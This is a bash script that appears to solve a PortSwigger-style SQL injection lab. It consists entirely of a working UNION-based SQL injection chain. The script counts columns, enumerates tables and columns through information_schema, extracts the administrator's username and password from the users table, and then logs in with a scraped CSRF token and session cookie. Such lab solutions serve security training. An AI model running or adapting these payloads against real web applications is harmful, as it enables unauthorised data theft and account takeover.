#!/bin/bash

source ../common.hook

PAYLOAD=$(url_encode "/filter?category=Gifts' UNION SELECT NULL-- ")

for i in {1..20}; do
    output "Trying ${PAYLOAD}" INFO
    curl "${PS_URL}${PAYLOAD}" | grep "Internal Server Error"
    if [ $(echo $?) -ne 0 ]; then
        output "Number of columns: ${i}" INFO; NUM_COLS=$i; break;
    fi

    PAYLOAD=$(url_encode "${PAYLOAD%--+},NULL-- ")
done

PAYLOAD=$(url_encode "/filter?category=Gifts' UNION SELECT 'a','a'-- ")
output "Trying ${PAYLOAD}" INFO
curl "${PS_URL}${PAYLOAD}"

PAYLOAD=$(url_encode "/filter?category=Gifts' UNION SELECT table_name,NULL FROM information_schema.tables-- ")
output "Trying ${PAYLOAD}" INFO
curl "${PS_URL}${PAYLOAD}" | grep "user"
TABLE="users_vlbmvy"
output "Users table: $TABLE" SUCCESS

PAYLOAD=$(url_encode "/filter?category=Gifts' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='${TABLE}'-- ")
output "Trying ${PAYLOAD}" INFO
curl "${PS_URL}${PAYLOAD}"
USERNAME_COLUMN="username_ifhupd"
PASSWORD_COLUMN="password_mdwxgv"
output "Username column: ${USERNAME_COLUMN}" SUCCESS
output "Password column: ${PASSWORD_COLUMN}" SUCCESS

PAYLOAD=$(url_encode "/filter?category=Gifts' UNION SELECT ${USERNAME_COLUMN},${PASSWORD_COLUMN} FROM ${TABLE}-- ")
output "Trying ${PAYLOAD}" INFO
curl "${PS_URL}${PAYLOAD}"
USERNAME="administrator"
PASSWORD="h7tfy16exkeswnhh4cjk"
output "Username: ${USERNAME}" SUCCESS
output "Password: ${PASSWORD}" SUCCESS

REQUEST=$(curl -c - "${PS_URL}/login")
CSRF=$(echo ${REQUEST} | sed -n "s/.*value=\"\(\S*\)\">.*/\1/p")
COOKIE=$(echo ${REQUEST} | sed -n "s/.*session\s\(\S*\)$/\1/p")

output "Trying POST on ${PS_URL}/login with -H (${COOKIE}) -d (${CSRF}|${USERNAME}|${PASSWORD})" INFO
curl "${PS_URL}/login" -H "Cookie: session=${COOKIE}" -d "csrf=${CSRF}&username=${USERNAME}&password=${PASSWORD}" -X POST

eval_result $PS_URL
